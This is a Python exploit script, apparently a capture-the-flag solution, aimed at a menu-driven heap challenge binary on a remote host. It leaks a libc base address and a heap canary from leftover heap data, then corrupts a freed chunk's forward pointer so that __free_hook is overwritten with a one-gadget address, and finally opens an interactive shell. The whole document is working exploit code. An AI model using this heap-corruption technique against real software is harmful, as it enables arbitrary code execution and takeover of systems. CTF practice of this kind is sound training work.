from ptrlib import *

def create(size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(size))
    return

def edit(data):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", data)
    return

def show():
    sock.sendlineafter("> ", "3")
    sock.recvuntil(": ")
    return sock.recvline()

def delete():
    sock.sendlineafter("> ", "4")
    return

libc = ELF("../distfiles/libc.so.6")
"""
sock = Process("../distfiles/chall")
"""
sock = Socket("76.74.177.238", 9001)
#"""
libc_main_arena = 0x3c4b20
libc_one_gadget = 0x4526a

# 1) leak libc (from _IO_2_1_stderr leftover)
create(0xb0)
create(0x140)
libc_base = u64(show()) - libc.symbol("_IO_file_jumps")
logger.info("libc base = " + hex(libc_base))

# 2) leak heap canary (from /dev/urandom buffer leftover)
create(1024)
data = show()
canary = b'\x00' + data[49:56]
if len(canary) != 8:
    logger.warn("Bad luck")
    exit(1)
logger.info(b"heap canary = " + canary)

# 3) overwrite __free_hook (by modifying fd)
# I used __free_hook since every one-gadget-rce didn't work on __malloc_hook
create(0x18)
delete()
create(0x58)
delete()
create(0x18)
payload = b'A' * 0x18
payload += canary
payload += p64(0x71)
payload += p64(libc_base + libc.symbol("__free_hook") - 0x1093)
edit(payload)
create(0x58)
create(0x58)
payload = b'/bin/sh\x00'
payload += b'\x00' * (0x58 - len(payload))
payload += canary
payload += b'\x00' * (3 + 0x1018)
payload += p64(libc_base + libc_one_gadget)
edit(payload)

# 4) get the shell!
delete()

sock.interactive()
